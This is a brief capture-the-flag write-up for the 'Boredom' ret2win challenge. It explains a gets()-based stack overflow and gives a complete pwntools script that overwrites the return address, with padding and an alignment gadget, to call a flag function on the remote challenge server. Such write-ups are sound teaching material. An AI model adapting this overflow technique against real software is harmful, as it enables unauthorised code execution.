# Boredom

Simple ret2win. It calls gets on rbp-0xd0, and there's a function called flag that grabs the flag from flag.txt


0xd0 + 8 bytes of padding + address of ret + flag function. Address of ret is needed on remote because stack alignment is a bitch

```python
from pwn import *
NUM_TO_RET = 0xd0 + 8
padding = b'A' * NUM_TO_RET
e = ELF("./boredom")
payload = flat(padding, 0x000000000040101a, e.symbols['flag'] , word_size=64)
#p = e.process()
p = remote('pwn.hsctf.com', 5002)
p.sendline(payload)
p.interactive()
```